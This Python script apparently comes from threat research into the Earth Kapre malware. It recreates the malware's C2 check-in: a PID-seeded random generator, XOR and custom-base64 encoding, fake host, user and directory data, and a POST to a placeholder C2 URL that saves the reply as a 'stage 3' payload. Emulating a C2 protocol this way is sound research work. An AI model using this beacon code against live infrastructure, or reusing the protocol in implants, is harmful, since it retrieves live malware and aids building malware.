import base64
import requests
from urllib import parse
from itertools import cycle
import struct
import random
import urllib3
import time
import threading


def generate_fake_pid():
    return random.randint(4000, 45000)

# Earth Kapre uses the current process ID multiplied
# by a constant as the seed for srand()
FAKE_PID = generate_fake_pid()
RNDSEED = (FAKE_PID * 0x679BCF5C) & 0xFFFFFFFF

def xor_data(data, key):
    return bytes(c ^ k for c, k in zip(data, cycle(key)))


def custom_b64decode(data):
    return base64.b64decode(data, altchars=b"-_", validate=True)


def custom_b64encode(data):
    return base64.b64encode(data, altchars=b"-_").decode()


def rand():
    global RNDSEED
    RNDSEED = (RNDSEED * 214013 + 2531011) & 0xffffffff
    return (RNDSEED >> 16) & 0x7fff


def generate_random_string(size):
    string = ""
    for i in range(size):
        string += chr(rand() % 0x1A + 0x61)
    return string


def generate_computer_name():
    result = "DESKTOP-"
    result += ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(7))
    return result.encode()


def simulate_c2_request(url):
    rand()
    xor_key = generate_random_string(3)
    xor_key_key_size = rand() % 15 + 5
    xor_key_key = generate_random_string(xor_key_key_size)
    stage_3_export_str_key_size = rand() % 15 + 5
    stage_3_export_str_key = generate_random_string(stage_3_export_str_key_size)
    files_dirs_key_size = rand() % 15 + 5
    files_dirs_key = generate_random_string(files_dirs_key_size)
    boolean_key_size = rand() % 15 + 5
    boolean_key = generate_random_string(boolean_key_size)
    username_key_size = rand() % 15 + 5
    username_key = generate_random_string(username_key_size)
    unknown_key_size = rand() % 15 + 5
    unknown_key = generate_random_string(unknown_key_size)
    computername_key_size = rand() % 15 + 5
    computername_key = generate_random_string(computername_key_size)

    computername = generate_computer_name()
    computername_value = custom_b64encode(xor_data(computername, xor_key.encode()))
    username_value = custom_b64encode(xor_data(b"Administrator", xor_key.encode()))

    files_dirs = b"\x0D\x0A\x0D\x0A\x0D\x0A.\x0D\x0A..\x0D\x0ACommon Files\x0D\x0Adesktop.ini\x0D\x0AGoogle\x0D\x0AInternet Explorer\x0D\x0AMicrosoft Update Health Tools\x0D\x0AModifiableWindowsApps\x0D\x0AReference Assemblies\x0D\x0ARUXIM\x0D\x0AUninstall Information\x0D\x0AWindows Defender\x0D\x0AWindows Defender Advanced Threat Protection\x0D\x0AWindows Mail\x0D\x0AWindows Media Player\x0D\x0AWindows Multimedia Platform\x0D\x0AWindows NT\x0D\x0AWindows Photo Viewer\x0D\x0AWindows Portable Devices\x0D\x0AWindows Security\x0D\x0AWindows Sidebar\x0D\x0AWindowsApps\x0D\x0AWindowsPowerShell\x0D\x0A\x0D\x0A\x0D\x0A.\x0D\x0A..\x0D\x0AApplication Data\x0D\x0AComms\x0D\x0AConnectedDevicesPlatform\x0D\x0AD3DSCache\x0D\x0AGoogle\x0D\x0AHistory\x0D\x0AIconCache.db\x0D\x0AMicrosoft\x0D\x0AOneDrive\x0D\x0APackages\x0D\x0APeerDistRepub\x0D\x0APlaceholderTileLogoFolder\x0D\x0APrograms\x0D\x0APublishers\x0D\x0ATemp\x0D\x0ATemporary Internet Files\x0D\x0AVirtualStore\x0D\x0A\x0D\x0A\x0D\x0A.\x0D\x0A..\x0D\x0AGoogle Chrome.lnk\x0D\x0AMicrosoft Edge.lnk\x0D\x0A\x0D\x0A\x0D\x0A"

    files_dirs_value = custom_b64encode(xor_data(files_dirs, xor_key.encode()))
    stage_3_export_str_value = custom_b64encode(xor_data(b"IfIxStId", xor_key.encode()))

    data = {
        computername_key : computername_value,
        unknown_key : "",
        username_key : username_value,
        boolean_key : "1",
        files_dirs_key : files_dirs_value,
        stage_3_export_str_key : stage_3_export_str_value,
        xor_key_key : xor_key
    }

    data_string = '&'.join([f'{k}={v}' for k, v in data.items()])

    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Content-type' : 'application/x-www-form-urlencoded',
        'Cache-Control' : 'no-cache',
        'Accept-Encoding' : urllib3.util.SKIP_HEADER,
        'Accept' : None,
        'Connection': None
    }
    print(f"Sending payload to C2: {url}, payload: {data_string}")
    resp = requests.post(url, headers=headers, data=data_string)
    print(f"Status Code: {resp.status_code}")
    if resp.status_code == 200 and len(resp.content) > 1:
        with open("out.bin", "wb") as f:
            f.write(resp.content)
            print("Successfully downloaded stage 3, see out.bin.")
            exit()


def main():

    # Simulate a C2 request to try and get the third stage
    # Note: This is only an example of what the C2 URL might look like
    c2_url = "<C2_URL_HERE>"

    t1 = threading.Thread(target=simulate_c2_request, args=(c2_url,))
    t1.start()
    t1.join()


if __name__ == "__main__":
    main()
